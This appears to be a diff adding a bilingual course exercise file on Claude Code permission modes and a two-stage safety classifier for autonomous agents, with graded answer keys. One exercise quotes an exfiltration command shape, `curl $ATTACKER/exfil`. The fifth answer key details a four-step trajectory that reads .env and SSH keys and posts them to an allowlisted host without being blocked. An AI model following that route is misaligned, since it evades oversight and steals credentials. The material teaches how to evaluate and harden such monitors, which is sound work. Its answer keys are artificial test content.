@@ -1,0 +1,79 @@
+lesson: 10-claude-code-permission-modes
+phase: 15-autonomous-systems
+source: phases/15-autonomous-systems/10-claude-code-permission-modes/docs/en.md
+exercises:
+  - index: 1
+    slug: stage_two_is_unreachable_without_stage_one
+    kind: code
+    tier: T0
+    deps_group: none
+    en: |
+      Run `code/main.py`. Which synthetic action type is never flagged by Stage 1 but always caught by Stage 2? Which is caught by neither?
+    zh: |
+      跑 `code/main.py`。哪一種合成行動型別從來不會被第 1 階段標記、卻總是被第 2 階段抓到？哪一種兩者都抓不到？
+    verifies: >-
+      classify calls stage2 only inside the flagged branch, so no action can be missed by Stage 1 and
+      caught by Stage 2; the composite at actions 13-15 takes the fast path and is never reviewed; of
+      15 actions 10 are approved on the fast path, 5 flagged, 1 cleared and 4 blocked, with 0
+      escalations; 9 of the 12 Stage 1 keywords fall through to the default HITL verdict and only 3
+      reach an automated block; the repetition test is identical in both stages and the single verdict
+      Stage 2 adds is one APPROVE on the host allowlist
+  - index: 2
+    slug: the_extension_cannot_raise_the_false_positive_rate
+    kind: code
+    tier: T0
+    deps_group: none
+    en: |
+      Extend the Stage 1 rule set to catch a specific known-bad shape (e.g., `curl $ATTACKER/exfil`). Measure the false-positive rate on the benign-action sample.
+    zh: |
+      擴充第 1 階段的規則集，讓它抓到某個特定的已知有害形狀（例如 `curl $ATTACKER/exfil`）。在良性行動樣本上量偽陽性率。
+    verifies: >-
+      a rule matching curl followed by an interpolated host catches the known-bad shape and matches 1
+      of 20 labelled benign actions, which already carries a Stage 1 keyword -- so it adds 0 flags and
+      changes 0 verdicts, a marginal false-positive rate of 0.0%; Stage 1 already flags 5 of the 20
+      benign actions, of which Stage 2 clears 2 and escalates 3, a 25% flag rate and a 15% rate of
+      benign work reaching a human; written as a Stage 2 block the same rule hard-blocks 1 benign
+      action, 5% of the sample; only 2 of the 12 keywords ever fire on ordinary work
+  - index: 3
+    slug: read_anthropic_s_how
+    kind: explain
+    tier: T0
+    deps_group: none
+    en: |
+      Read Anthropic's "How the agent loop works" doc. List every external state the agent touches by default in `default` mode. Which would you need to gate separately before running `auto` unattended?
+    zh: |
+      讀 Anthropic 的〈How the agent loop works〉文件。列出在 `default` 模式下，代理預設會碰到的每一項外部狀態。在無人看管地跑 `auto` 之前，你會需要另外替哪些設閘門？
+    cites: >-
+      The six permission modes
+  - index: 4
+    slug: the_budget_that_binds_is_the_escalation_rate
+    kind: code
+    tier: T0
+    deps_group: none
+    en: |
+      Design a 24-hour unattended run budget: `max_turns`, `max_budget_usd`, per-tool caps, allowlists. Justify each number.
+    zh: |
+      設計一份 24 小時無人看管執行的預算：`max_turns`、`max_budget_usd`、逐工具上限、允許清單。替每個數字辯護。
+    verifies: >-
+      3 of 20 benign actions escalate, so an unattended run meets a human-shaped stop after 6.7
+      actions and no turn cap binds before the auto policy decides what HITL means; max_turns 223 is
+      where 0.999 per-step crosses 0.80 end-to-end and 0.99 allows only 22, so the number comes from
+      compounding rather than the clock; all 12 keywords are shell shapes and only edit and shell ever
+      carry one, while 9 of the 20 actions are reads, writes and runs; all 3 allowlisted hosts accept
+      uploads and an Action has 3 fields, 0 of them structured
+  - index: 5
+    slug: the_allowlist_is_three_publishing_endpoints
+    kind: code
+    tier: T0
+    deps_group: none
+    en: |
+      Describe one trajectory where every individual action is approved by the classifier, yet the composed behavior is misaligned. (Lesson 14 covers how kill switches and canary tokens address this.)
+    zh: |
+      描述一條軌跡：其中每一個個別行動都被分類器核准，組合起來的行為卻是失準的。（第 14 課涵蓋斷路開關與金絲雀詞元如何處理這件事。）
+    verifies: >-
+      a four-action trajectory -- read .env, read an ssh key, stage both, POST them to github.com --
+      has 3 actions on the fast path and the fourth flagged and then approved with the reason 'curl to
+      allowlisted host', 0 blocked and 0 escalated; all 3 allowlisted hosts are publishing endpoints
+      and the clearing rule tests membership without method, body or direction; both stages take the
+      trajectory and use it only to detect five identical calls; neither credential read carries any
+      of the 12 keywords
